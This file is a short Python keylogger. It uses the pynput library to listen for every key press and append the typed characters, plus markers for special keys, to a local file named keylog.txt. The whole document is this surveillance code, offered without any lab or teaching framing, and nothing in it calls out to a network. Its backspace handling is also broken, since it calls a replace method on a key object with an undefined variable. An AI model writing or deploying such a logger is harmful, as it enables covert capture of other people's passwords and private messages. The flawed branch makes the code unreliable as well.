from pynput import keyboard
import os

outputfile = "keylog.txt"

def on_press(key) :
    try:
        with open(outputfile, 'a') as f:
            f.write(key.char)
    except AttributeError:
         with open(outputfile, 'a') as f:
            if str(key) == "Key.space":
                 f.write(" ")

            elif str(key) == "Key.enter":
                 f.write(" \n")

            elif str(key) == "Key.right" or str(key) == "Key.left" or str(key) == "Key.up" or str(key) == "Key.down" or str(key) == "Key.shift" or str(key) == "Key.shift_r" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.alt_l" or str(key) == "Key.alt_r" or str(key) == "Key.tab":
                 f.write(" ")

            elif str(key) == "Key.backspace":
               key = key.replace(char_to_remove, '')
            else :
                 f.write(f'[ {str(key)} ]')


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()